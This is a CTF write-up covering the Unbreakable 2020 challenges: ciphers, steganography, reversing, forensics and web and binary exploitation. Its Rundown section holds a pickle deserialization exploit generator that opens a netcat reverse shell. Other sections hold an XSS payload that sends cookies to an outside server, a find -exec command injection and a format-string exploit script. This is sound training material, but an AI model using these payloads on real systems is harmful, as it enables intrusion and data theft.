# Writeup Unbreakable 2020

Challenge-uri solide, had plenty of fun.

## Lost message

We try and reverse functions one by one.

The function `enc2` appers to simply rotate A-Za-z and since we know the key to be 35 we can simply call `enc2("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", 35)` to create a mapping for each character.  The result is the string `jklmnopqrstuvwxyzabcdefghiJKLMNOPQRSTUVWXYZABCDEFGHI` which we will use in the decode function from below:

```
def dec2(string):
    mapping = dict()
    res = ""
    for i, j in zip("jklmnopqrstuvwxyzabcdefghiJKLMNOPQRSTUVWXYZABCDEFGHI", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"):
        mapping[i] = j

    for c in string:
        res = res + mapping[c]

    return res
```

The function `enc1` does the following:
 * Pad the string with `z` in order to have a length multiple of the key length
 * string on a matrix with `len(key)` columns and `ceil(len(msg) / len(key))` lines
 * concatenates columns in an order dictated by the key
We just write a function that reverses these operations.


```
def dec1(msg, key="zxdfiuypka"):
    cipher = "" 
    k_indx = 10
    percol = math.ceil(len(msg) / len(key))
    key_lst = sorted(list(key)) 
    col = len(key)

    matrix = []
    columns = dict()
    
    for _ in range(col): 
        k_indx -= 1
        curr_idx = key.index(key_lst[k_indx])

        columns[curr_idx] = msg[-percol:]
        msg = msg[:-percol]

    for row in range(percol):
        matrix.append([])
        for i in range(col):
            matrix[row].append(columns[i][row])

    res = "".join(["".join(line) for line in matrix])

    return res.rstrip("z")
```

The function enc3 is by far the most intimidating yet very easy to solve. Most of the code is used to create a substitution dictionary without input from the text or the key. We will just use the subtitution dict but in reverse direction; from value to key.
The regex in this function seems to be used to split the message in pairs of two characters. I skipped using this completely.

One note about the encryption function is that some characters (for example identical consecutive characters on certain positions) might have a `Z` appended to them before the substitution. We keep this in mind as some decoded `Z`'s might not actually exist in the original text.

```
def dec3(text, key="recomanded"):
    t=lambda x: x.upper().replace('J','I')
    s=[]
    for _ in t(key+asc):

        if _ not in s and _ in asc:

            s.append(_)

    m=[s[i:i+5] for i in range(0,len(s),5)]
    enc={row[i]+row[j]:row[(i+1)%5]+row[(j+1)%5] for row in m for i,j in d(range(5),repeat=2) if i!=j}
    enc.update({col[i]+col[j]:col[(i+1)%5]+col[(j+1)%5] for col in zip(*m) for i,j in d(range(5),repeat=2) if i!=j})
    enc.update({m[i1][j1]+m[i2][j2]:m[i1][j2]+m[i2][j1] for i1,j1,i2,j2 in d(range(5),repeat=4) if i1!=i2 and j1!=j2})

    dec = {}
    for key, val in enc.items():
    	dec[val] = key

    splitted = [text[i:i+2] for i in range(0, len(text), 2)]

    return ''.join(dec[s] for s in splitted)
```

The last function is enc4 and by analyzing it we notice it is actually rail fence encoding. I used [CyberChef](https://gchq.github.io/CyberChef/) to decode this last part.

After applying `dec2`, `dec1` and `dec3` we get the following text: `KNHEECCIEQRTNPNYAGQOPWYITQOTEZEUADRZRCQAQIAQCNLSOUINME`. We remove the extra `Z`'s added by `enc3` and we get `KNHEECCIEQRTNPNYAGQOPWYITQOTEEUADRRCQAQIAQCNLSOUINME`. By using the CyberChef rail fence decoding with key 13 we get `KEEPQYOURQCOMUNICATIONQENCRYPTEDQALIENSQAREQWATCHING`.
The last step is to replace the `Q`'s with _ and we get `KEEP_YOUR_COMUNICATION_ENCRYPTED_ALIENS_ARE_WATCHING`.

#### Flag

ctf{f5a2b03dedff103725131a2ce238bdc31b00accba79091237d566561cdfe6ec5}


## tsunami researcher 

Upon listening to the wav file I immediately assumed it was the classic stego challenge of encoding data in the audio file which can be retrieved by looking at the spectrogram.

I used the tool [Sonic Visualizer](https://www.sonicvisualiser.org/) `right click -> Layer -> Add Melodic Range Spectogram` and played around with the knobs until I saw this image.

The code was `spectogram`.

![Melodic Range Spectrogram](https://i.imgur.com/ZjF1Aas.png)

#### Flag

ctf{cc3a329919391e291f0a41b7afd3877546f70813f0c06a8454912e0a92099369}

## Russian doll

Another challenge that keeps popping up in CTFs, archives in archives. I personally dislike this type of challenge because it's not much you can learn from it. I've written this really ugly bash script to extract the flag. It mostly checks the file type, maybe runs john the ripper on the password and then extracts the file.

```
ARCH=$1
JOHN='/home/pandora/sec/tools/JohnTheRipper/run/john'
JOHN_ZIP='/home/pandora/sec/tools/JohnTheRipper/run/zip2john'
JOHN7Z='/home/pandora/sec/tools/JohnTheRipper/run/7z2john.pl'
HFILE=hash

while [ true ]; do
        OUTPUT=$(file $ARCH)
        if echo $OUTPUT | grep 'gzip compressed data'; then
                echo "IZ GZ"
                mv $ARCH "$ARCH.gz"
                gunzip $ARCH
        elif echo $OUTPUT | grep 'Zip archive data, at least v2.0 to extract'; then
                echo "IZ ZIP v2"
                mv $ARCH "$ARCH.zip"

                $JOHN_ZIP "$ARCH.zip" > $HFILE && $JOHN $HFILE || exit 1
                PASSWORD=$(/home/pandora/sec/tools/JohnTheRipper/run/john --show $HFILE | grep "$ARCH.zip" | cut -d ':' -f 2 | cut -d ' ' -f 1)

                NEW_ARCH=$(unzip -P $PASSWORD $ARCH.zip | grep -e 'inflating' | cut -d ' ' -f4)
                ls archives || exit 1
                rm "$ARCH.zip" && echo "removing $ARCH.zip"

                echo "Variables are $ARCH $NEW_ARCH"

                ARCH=$(echo $NEW_ARCH | cut -d '/' -f 2)

                rm $HFILE
                mv $NEW_ARCH $ARCH
                rmdir archives
        elif echo $OUTPUT | grep 'Zip archive data, at least v1.0 to extract'; then
                echo "IZ ZIP"
                mv $ARCH "$ARCH.zip"

                $JOHN_ZIP "$ARCH.zip" > $HFILE && $JOHN $HFILE || exit 1
                PASSWORD=$(/home/pandora/sec/tools/JohnTheRipper/run/john --show $HFILE | grep "$ARCH.zip" | cut -d ':' -f 2 | cut -d ' ' -f 1)

                NEW_ARCH=$(unzip -P $PASSWORD $ARCH.zip | grep -e 'extracting' | cut -d ' ' -f3)
                ls archives || exit 1
                rm "$ARCH.zip" && echo "removing $ARCH.zip"

                echo "Variables are $ARCH $NEW_ARCH"

                ARCH=$(echo $NEW_ARCH | cut -d '/' -f 2)

                rm $HFILE
                mv $NEW_ARCH $ARCH
                rmdir archives
        elif echo $OUTPUT | grep '7-zip archive data'; then
                echo "IZ 7z"
                mv $ARCH "$ARCH.7z"

                $JOHN7Z "$ARCH.7z" > $HFILE && $JOHN $HFILE || exit 1
                PASSWORD=$(/home/pandora/sec/tools/JohnTheRipper/run/john --show $HFILE | grep "$ARCH.7z" | cut -d ':' -f 2 | cut -d ' ' -f 1)
                echo "pass is '$PASSWORD'"

                7z e "$ARCH.7z" -p"$PASSWORD" -so > out
                rm "$ARCH.7z"
                rm $HFILE
                ARCH=out
        else
                echo 'unk'
        fi
done
```

#### Flag

ctf{8ffe609c04a7001a908da5b481442ce1ce3208f2a4f3a6862e144bb1f320c54e}

## gogu

This was the first time I actually reversed a go binary. Running `strings gogu.exe` gives some hints to the fact that this is a go binary like `fmt.GoStringer` or `GOROOT`. I've tried disassembling the binary with IDA but there were simply too many functions to get anything useful.

After a bit of googling I found [this article](https://cujo.com/reverse-engineering-go-binaries-with-ghidra/) which states that even stripped go binaries still retain information about function names. This article links to a [ghidra script](https://github.com/getCUJO/ThreatIntel/tree/master/Scripts/Ghidra) which can be used to retrieve the function names. Neat!

Using the ghidra decompiler we decompile the function main.main, we see the following main structure:
```
main() {
    main.main.func1(params);
    runtime.convT2Estring(params);
    fmt.Println(params);


    main.main.func2(params);
    runtime.convT2Estring(params);
    fmt.Println(params);


    main.main.func3(params);
    main.Adhdcapgkdlapgolgboe(params);
    runtime.convT2Estring(params);
    fmt.Println(params);
}
```
We notice it calls three functions `main.main.func1`, `main.main.func2` and `main.main.func3`. After each function call it calls a formatting function and then a print function. Since the binary prints three lines, we can assume each function has something to do with each line.

Out of the three lines listed below the only line which is really interesting is the last one which looks like a part of the flag.

```
$ ./gogu.exe 
Welcome to gogu!
Good luck!
a961f71e0f287ac52a25aa93be854377
```

Disassembling of the `main.main.func3` show this basic structure:

```
while( true ) {
  if (uVar5 <= uVar3) break;
  bVar2 = *(byte *)(local_10 + uVar3) ^ *(byte *)(local_b8 + uVar3);
  param_1 = (ulong)bVar2;
  if (0x44 < uVar3) break;
  *(byte *)((long)&local_55 + uVar3) = bVar2;
  uVar3 = uVar3 + 1;
}
```

It appears to run a xor between two strings. We investigate further with gdb by placing a breakpoint at the `main.main.func3` address `0x00483d30` as extrated from ghidra. We navigate around the function until we reach an the xor part of the code:
```
0x483e10:	movzx  edi,BYTE PTR [rbx+rsi*1]
0x483e14:	cmp    rsi,rax
0x483e17:	jae    0x483e7c
0x483e19:	movzx  r8d,BYTE PTR [rcx+rsi*1]
0x483e1e:	xor    edi,r8d
```

We palce a breakpoint on the address `0x483e10` and extract the two strings present at the addresses rbx and rcx:

```
$ x/69b $rcx
0xc4200200a0:	0x4c	0x8c	0x50	0x8c	0x04	0x1e	0xbe	0x39
0xc4200200a8:	0x9c	0x79	0x1d	0xcf	0xca	0xa2	0xef	0xf3
0xc4200200b0:	0xa8	0x27	0xc4	0xa6	0xbc	0x85	0x49	0x3c
0xc4200200b8:	0x20	0x2d	0x93	0xf6	0x9d	0x26	0xac	0xce
0xc4200200c0:	0x02	0xcf	0x32	0x2f	0xdc	0xfd	0x08	0xc6
0xc4200200c8:	0xde	0xb2	0xaa	0x11	0x78	0xdb	0xd3	0xc1
0xc4200200d0:	0x05	0x1f	0xf1	0x32	0x1f	0x8c	0x26	0x49
0xc4200200d8:	0x36	0xa9	0xb0	0x48	0x8b	0xf5	0x60	0x85
0xc4200200e0:	0xdb	0x6b	0xb2	0xc5	0x59
$ x/69b $rbx
0xc420020050:	0x2f	0xf8	0x36	0xf7	0x35	0x78	0xdb	0x0f
0xc420020058:	0xa5	0x4c	0x29	0xf7	0xfd	0x92	0x8d	0x92
0xc420020060:	0xca	0x43	0xf1	0x93	0xde	0xe4	0x7f	0x59
0xc420020068:	0x15	0x49	0xf5	0x97	0xa8	0x11	0xc8	0xfa
0xc420020070:	0x67	0xab	0x03	0x1e	0xbd	0x9c	0x6a	0xa4
0xc420020078:	0xe9	0x82	0x9f	0x22	0x4b	0xe8	0xea	0xf6
0xc420020080:	0x67	0x26	0xc9	0x07	0x7c	0xb4	0x1f	0x79
0xc420020088:	0x01	0x9d	0x89	0x2b	0xe9	0x93	0x03	0xb2
0xc420020090:	0xbe	0x58	0x82	0xf3	0x24
```

Finally we make the xor ourself by running the following code:
```
a = "\x2f\xf8\x36\xf7\x35\x78\xdb\x0f\xa5\x4c\x29\xf7\xfd\x92\x8d\x92\xca\x43\xf1\x93\xde\xe4\x7f\x59\x15\x49\xf5\x97\xa8\x11\xc8\xfa\x67\xab\x03\x1e\xbd\x9c\x6a\xa4\xe9\x82\x9f\x22\x4b\xe8\xea\xf6\x67\x26\xc9\x07\x7c\xb4\x1f\x79\x01\x9d\x89\x2b\xe9\x93\x03\xb2\xbe\x58\x82\xf3\x24"
b = "\x4c\x8c\x50\x8c\x04\x1e\xbe\x39\x9c\x79\x1d\xcf\xca\xa2\xef\xf3\xa8\x27\xc4\xa6\xbc\x85\x49\x3c\x20\x2d\x93\xf6\x9d\x26\xac\xce\x02\xcf\x32\x2f\xdc\xfd\x08\xc6\xde\xb2\xaa\x11\x78\xdb\xd3\xc1\x05\x1f\xf1\x32\x1f\x8c\x26\x49\x36\xa9\xb0\x48\x8b\xf5\x60\x85\xdb\x6b\xb2\xc5\x59"
sol = ""
for i in range(69):
	sol = sol + chr(ord(a[i]) ^ ord(b[i]))

print sol
```

#### Flag

ctf{1fe6954870babd55ba6e5dfa57d4ed11aabb70533397b985c890749cbfc7e306}

## zanger

There were a total of 138 tcp packages, two of them having the destination port of 1337 and the rest of them a destination port between 0-7. A flag has a length of 69 characters so every two tcp packets could encode a flag chatacter. The fact that the 1337 destination ports were on the correct positions to represent the `{` and `}` chracters gave the hint that this is indeed the right way. The first destination ports were `6 3 7 4 6 6` -> `63 74 66` -> `ctf` so this is definitely the solution. I extracted the destionation ports using the command `tshark -Y "tcp" -T fields -e tcp.dstport -r copy.pcap  | tr -d '\n'` then I replaced the ports `7 1337` with a curly brace which left us with `637466{32663065353366616532353732633335386238326264646466366430326234613533313563633435336432643961316466373931346264666665366536316161}`. Decoding from hex gives us the flag.

#### Flag

ctf{2f0e53fae2572c358b82bdddf6d02b4a5315cc453d2d9a1df7914bdffe6e61aa}

##

## Alien console

We play around with some payloads and analyze the output. Sending the same character 100 times results in an interesting output:

```
$ python -c 'print("c"*200)'  | nc 34.89.159.150 32653
cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
Welcome, enter text here and we will secure it: 0017051802020200535a5a0107505b055557005a515a54015a5a535601070202005b50515055560200025305515554525a0700535101540000510055525a5000020057071e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

Changing the character seems to control what repeated character we see at the end of the response so I assumed some sort of substitution is being used. We know the flag format only contains the characters `0-9a-ft` and `{}` but the curly braces can just be deduced from the position.

We send another payload which contains the whole flag character set in order to find the substitutions for each character:

```
$ python -c 'print("c"*100 + "tfabdef0123456789")'  | nc 34.89.159.150 32653
cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccctfabdef0123456789
Welcome, enter text here and we will secure it: 0017051802020200535a5a0107505b055557005a515a54015a5a535601070202005b50515055560200025305515554525a0700535101540000510055525a5000020057071e000000000000000000000000000000000000000000000000000000000000001705020107060553525150575655545b5a
```

By looking at the end of the response we see the string `001705020107060553525150575655545b5a` which corresponds to `ctfabdef0123456789`. We replace '00' -> 'c', '17' -> 't' etc. and we get the flag


#### Flag
ctf{aaac099bd38f64c9297b9905bdaac832365aca0f26719dc02b7cc2c6193cac4d}


## Imagine that

Connecting to the challenge gives the following output:

```
$ nc 35.242.239.180 30622
Enter starting point: 0
0
Enter starting point: 0
0
Traceback (most recent call last):
  File "server.py", line 12, in <module>
    print(buf[:int(end):int(start)])
ValueError: slice step cannot be zero
```

We try and feed the program even more wrong outputs in order to get more of the source code:
```
$ nc 35.242.239.180 30622
Enter starting point: a
a
Enter starting point: a
a
Traceback (most recent call last):
  File "server.py", line 9, in <module>
    if (int(end) - int(start) > 10):
ValueError: invalid literal for int() with base 10: 'a'
```

So the start variable is the step and the end variable is the end. Based on the errors we get we cand deduce the first number we send is the step and the second one is the end of the slice.
We can bypass the check `int(end) - int(start) > 10` by sending a negative number for the `end` variable.  This way we can retrieve the whole buffer.

By looking at the retrieved data we notice the 'PNG' string -> its an image!
However trying to open the image results in an error. 
 * One of the errors is caused by how we retrieved it `buf[:-1:1]` sends the whole buffer, minus the last character. A quick look on [Wikipedia](https://en.wikipedia.org/wiki/Portable_Network_Graphics#Examples) tells us the last character needs to be `0x82` so we just append it.
 * The second error is more complicated so we use the tool `pngcheck -v image.png `. The output says `File is CORRUPTED.  It seems to have suffered Unix->DOS conversion.` and after a quick look on the internet we see it is somehow related to the end of line characters in Windows '\r\n'. On a quick inspection of the file we notice the file magic is `89 50 4E 47 0D 0D 0A 0D 1A 0D 0A` instead of `89 50 4E 47 0D 0A 1A 0A`. We just need to repalce all the `0D 0A` with `0A`. I used sublime to make this replacement but bless would have worked as well.

It is a QR code and it decodes to `asdsdgbrtvt4f5678k7v21ecxdzu7ib6453b3i76m65n4bvcx`. We send this string as a password to the netcat applcation and we get the flag.

![QR Code](https://i.imgur.com/ZjF1Aas.png)

#### Flag

ctf{1e894e796b65e40d46863907eafc9acd96c9591839a98b3d0c248d0aa23aab22}

## The code

By studying the code we notice that a lot of chracters are forbidden by coditions `$`, `>`, `&`, `:` and the string `php`. On top of that `escapeshellcmd` will escape most of the characters like `?` and `*`. Since the command being ran is `find` we can try and exploit it by using `-exec`. However in order for any command
to be executed we need to actually find a file with the find command. In order to bypass this restriction we use the `-o` flag. If no files are found the exec expression will be executed. As such the payload is:

`?start=1&arg= -or -exec cat flag ;`

Interestingly enough the payload works because the function `escapeshellcmd` escapes the `;` charater and makes the command valid. After running this we get the flag two times and in upper case. We remove the duplicate and proceed with rewriting the flag. I used [CyberChef](https://gchq.github.io/CyberChef/) yet again for this task, because selecting encoded characters highlights the corresponding decoded characters and vice-versa.

NOTE: In base64 encoding every four b64 digits decode to three ascii digits. Knowing this we can split the flag in chunks of four and decode them individually.

```
Upper case b64 flag: Y3RME2FHZJE1Y2FJZMJHNJE1ZDUXMZCYMZG2OTA5YZQ3NZFMMDGZNJI4NGFKMWE1MZLIY2VMNDKYMDFJNJYWNJMXZWR9
Lower case b64 flag: Y3Rme2FhZjE1Y2FjZmJhNjE1ZDUxMzcyMzg2OTA5YzQ3NzFmMDgzNjI4NGFkMWE1MzliY2VmNDkyMDFjNjYwNjMxZWR9

```

#### Flag

ctf{aaf15cacfba615d51372386909c4771f0836284ad1a539bcef49201c660631ed}


## Rundown

Running a get command on the server displays the message `APIv2 @ 2020 - You think you got methods for this?`. Upon sending a post request we are met with Werkzeug error trace:

```
    @app.route("/", methods=["POST"])
    def newpost():
    Open an interactive python shell in this frame  ​picklestr = base64.urlsafe_b64decode(request.data
      if " " in picklestr:
        return "The ' ' is blacklisted!"
      postObj = cPickle.loads(picklestr)
      return ""
      
    if __name__ == "__main__":
        app.run(host = "0.0.0.0", debug=True)
```

It appears the server is trying to deserialize data in an unsafe manner. I started working on this task with [this script](https://gist.github.com/msamogh/bb9bad96046ad390e5ae62f7e8b1d78c).

My first attempt was to run a sleep command in order to check if I can run shell commands. Two main difficulties need to be overcome in order to do this:
 * The os library might not be imported by the server (turned out to be true)
 * The space character is not allowed inside our payload
 
The command we are trying to run is `os.system("sleep 10")`.
In order to bypass the space character check we can change the command into `eval('os.system("sleep"+str(chr(32))+"10")')`. By using this trick we dont actually send any spaces and the command works as intended.
To avoid needing to `import os` we can replace `os` with `__import__("os")`. The command we needed to send becomes `eval('os.system("sleep"+str(chr(32))+"10")')` and does indeed result in the server sleeping for 10 seconds. We will use this formatting for any future commands we try to send to the server

Now we could try and send a `cat flag` command however that would be no good because the server would jsut display the result locally and not send it over the web. We need to get a reverse shell. I initially tried to `curl` or `wget` a payload which I would later execute to achieve a reverse shell, however the programs did not seem to be installed. I ran the commands `ls <PATH> || sleep 10` in order to check if certain programs existed. If the response returned immediately it meant the program existed. I found that `/bin/nc.traditional` is installed on the server.

I ran the command `nc -l -p 4000` locally and sent the command `/bin/nc.traditional -e /bin/bash <snip> 4000` to the server which resulted in a reverse shell.

The final payload generator looked like this:
```
#!/usr/bin/env python

import os
import sys
import pickle
import cPickle
import base64

class Exploit(object):
    def __reduce__(self):
        return (eval(fn), (cmd,))

try:
    pickle_type = sys.argv[3]
    cmd = sys.argv[2]
    fn = sys.argv[1]
except:
    pickle_type = 'cpickle' # or cpickle
    # cmd = '__import__("os").system("/usr/bin/wget"+str(chr(32))+"http://<snip>:4000/rev_shell.py"+str(chr(32))+"-O"+str(chr(32))+"/tmp/rev_shell.py")'
    cmd = '__import__("os").system("/bin/nc.traditional"+str(chr(32))+"-e"+str(chr(32))+"/bin/bash"+str(chr(32))+"<snip>"+str(chr(32))+"4000")'

    fn = 'eval'

print("Will {} {}({})".format(pickle_type, fn, cmd))
shellcode = pickle.dumps(Exploit())
print(base64.b64encode(shellcode))
```

I used Burp Suite as a proxy in order to change in flight requests with the desired POST verb and the payload. After getting the reverse shell I ran `cat flag`

#### Flag

ctf{f94f7baf771dd04b5a9de97bceba8fc120395c04f10a26b90a4c35c96d48b0bb}

## Manual review

I created an account on the webserver and send the message <script>alert(1);</script> which prompted the alert(1) message. After navigating the whole website and not finding anything I tought that maybe there was an "admin" which does review my message in the backend and does run the javascript code sent by me.

I ran a local server and sent the payload `<img src=x onerror=this.src='http://<snip>:4000/leak?cookie='+document.cookie>` which resulted in an access from an external IP. The cookies were not very helpful because of the httponly flag so i started to dump more data from the remote browser. Other dumped data:
 * the `document.body` only displayed the request number
 * the `window.location.href` displayed the url used by the server (something along the lines of `asdasdasdasdasdasdadadadad`). It would only display the last message and only once so it was not very useful
 * the `navigator.userAgent` which did contain the flag

#### Flag

ctf{ff695564fdb6943c73fa76f9ca5cdd51dd3f7510336ffa3845baa34e8d44b436}

## Not a fuzz


Looking with IDA at the disassembled code we get the following:

```
  v8 = 'XXXXDAED';
  v9 = 'XXXXDAED';
  v10 = 'XXXXDAED';
  v11 = 'XXXXDAED';
  v12 = 'XXXXDAED';
  v13 = 'XXXXDAED';
  v14 = 'XXXXDAED';
  v15 = 'XXXXDAED';
  v16 = 'XXXXDAED';
  v17 = 'XXXXDAED';
  v18 = 'XXXXDAED';
  v19 = 'XXXXDAED';
  v20 = 'XXXXDAED';
  v21 = 'XXXXDAED';
  v22 = 'XXXXDAED';
  v23 = 'XXXXDAED';
  v24 = 'XXXX}';
  memset(&v25, 0, 0x12F8uLL);
  for ( i = 1; i <= 9999; ++i )
  {
    if ( i == 3 )
    {
      puts("Do you have the control?");
      __isoc99_scanf("%1023[^\n]", &format);
      while ( getchar() != 10 )
        ;
      printf(&format, &format, v4);
      puts("It does not look like. You have the alt!");
    }
    else
    [...]
```

We are able to provide a format string for printf and the flag is on the stack in the same function. We just need to retrieve the position of the flag relative to ESP when `printf(&format, &format, v4);` is called. Running find ctf in peda returns the stack address where the ctf is stored `0x7fffffffca90` and the esp is at `0x7fffffffc680` when calling `printf` so we need to print starting from the position`(0x7fffffffca90 - 0x7fffffffc680) / 8 = 130`and up.

We use the positional specifier for printf `%130$llu`in order to print the full 8B (which is not really necessary due to how the flag is structured).
I wrote the following exploit script:

```
from pwn import *

local = False

exec_path = "./chall"
HOST = "35.246.180.101"
PORT = 31425

flag = ""

for num in range(130, 160):
	if local:
		io = process(exec_path)
	else:
		io = remote(HOST, PORT)
	payload = '%' + "%d" % num + "$llu"
	io.recvline()
	io.recvline()

	io.sendline("a")
	if not local:
		io.recvline() # the double a	
	io.recvline() # the a

	io.recvline()
	io.recvline()
	io.sendline("a")

	if not local:
		io.recvline() # the double a
	io.recvline() # the a

	print(io.recvline())
	print(io.recvline())
	io.sendline(payload)

	if not local:
		io.recvline()

	good_result = io.recvline()

	res = str(hex(int(good_result.replace("It does not look like. You have the alt!", "")))).replace("0x", "")

	split_res = [res[i:i+2] for i in range(0, len(res), 2)]

	for char in split_res[::-1]:
		decoded_char = chr(int(char, 16))
		if decoded_char != 'X':
			flag = flag + decoded_char
	io.close()

print(flag)
```

We get:
`\x00\x00\x00ctf{fad65340180f6b4c6f49dad138daeed447cf23f994635481f92551f05dbc6070}\x00\x00\x00`

Turns out that I was a bit off with my offsets but it does the job.


#### Flag

ctf{fad65340180f6b4c6f49dad138daeed447cf23f994635481f92551f05dbc6070}

## Better cat

Classic basic task with plaintext string in memory.

```
$ strings cat.elf
[...]
 ctf{a81H
8778ec7aH
9fc19887H
24ae3700H
b42e998eH
b09450eaH
b7f1236eH
53bfdcd9H
23878}
[...]
```

Rearrange flag and we get the solution.

#### Flag
ctf{a818778ec7a9fc1988724ae3700b42e998eb09450eab7f1236e53bfdcd923878}


# Unsolved challenges

## We Are In Danger

### What I solved

This was the frist time I solved 

```
$ volatility --plugins=volatility-plugins/ -f e.bin --profile=Win7SP1x64 cmdscan
Volatility Foundation Volatility Framework 2.6
**************************************************
CommandProcess: conhost.exe Pid: 3912
CommandHistory: 0x24eb50 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 2 LastAdded: 1 LastDisplayed: 1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
Cmd #0 @ 0x24bbf0: the latest one is dmp 3402
Cmd #1 @ 0x227860: echo 'the latest one is dmp 3402'
Cmd #15 @ 0x210158: $
```

We seem to be on the look for a data dump. If we search for the string 3402 we get the following:

```
$ strings e.bin  | grep 3402
[...]
fire.dmp.3402
[...]
```

Looking for files containing `3402` does not yield any results for files however looking for fire yields some results:

```
$ volatility --plugins=volatility-plugins/ -f e.bin --profile=Win7SP1x64 filescan | grep fire
Volatility Foundation Volatility Framework 2.6
0x000000007efa9f20      2      0 -W-rwd \Device\HarddiskVolume2\Users\wolf\Desktop\fire.dmp.zip
0x000000007fa62a20     16      0 RW---- \Device\HarddiskVolume2\Users\wolf\Desktop\fire.dmp.zip
0x000000007fdd7b40      2      0 RW-rwd \Device\HarddiskVolume2\Users\wolf\Downloads\fire.dmp.zip
0x000000007fe92d00      2      0 RW-rw- \Device\HarddiskVolume2\Users\wolf\AppData\Roaming\Microsoft\Windows\Recent\fire.dmp (2).lnk
```

Extracting the files with the following commands yields 3 results however none of them seem relevant:
```
$ volatility --plugins=volatility-plugins/ -f e.bin --profile=Win7SP1x64 dumpfiles -Q 0x000000007efa9f20 --dump-dir=export
Volatility Foundation Volatility Framework 2.6
DataSectionObject 0x7efa9f20   None   \Device\HarddiskVolume2\Users\wolf\Desktop\fire.dmp.zip
$ volatility --plugins=volatility-plugins/ -f e.bin --profile=Win7SP1x64 dumpfiles -Q 0x000000007fa62a20 --dump-dir=export
Volatility Foundation Volatility Framework 2.6
DataSectionObject 0x7fa62a20   None   \Device\HarddiskVolume2\Users\wolf\Desktop\fire.dmp.zip
$ volatility --plugins=volatility-plugins/ -f e.bin --profile=Win7SP1x64 dumpfiles -Q 0x000000007fdd7b40 --dump-dir=export
Volatility Foundation Volatility Framework 2.6
DataSectionObject 0x7fdd7b40   None   \Device\HarddiskVolume2\Users\wolf\Downloads\fire.dmp.zip
$ volatility --plugins=volatility-plugins/ -f e.bin --profile=Win7SP1x64 dumpfiles -Q 0x000000007fe92d00 --dump-dir=export
Volatility Foundation Volatility Framework 2.6
DataSectionObject 0x7fe92d00   None   \Device\HarddiskVolume2\Users\wolf\AppData\Roaming\Microsoft\Windows\Recent\fire.dmp (2).lnk
```


### What I did not solve

Apparently volatility does some checks in the backround and only extracts files after those checks. Only 3 files were written from the previous commands. The only file which was not written was the good one. In order to make volatility extract the fiels without checks the `-u`flag needs to be specified.

The commands which extracts the file is the following:

```
$ volatility --plugins=volatility-plugins/ -f e.bin --profile=Win7SP1x64 dumpfiles -u -Q 0x000000007fa62a20 --dump-dir=export
Volatility Foundation Volatility Framework 2.6
DataSectionObject 0x7fa62a20   None   \Device\HarddiskVolume2\Users\wolf\Desktop\fire.dmp.zip
$ file export/file.None.0xfffffa8002889dc0.dat 
export/file.None.0xfffffa8002889dc0.dat: Zip archive data, at least v2.0 to extract
```

We extract the archive and run the following command:

```
$ strings fire.dmp.3402 | grep flag
passwordflagwin
[...]
```

#### Flag

ctf{9586b1bba71db9c301f354be9a84ddde3e1b35f6a933928f0aaf4f7e65d194cf}
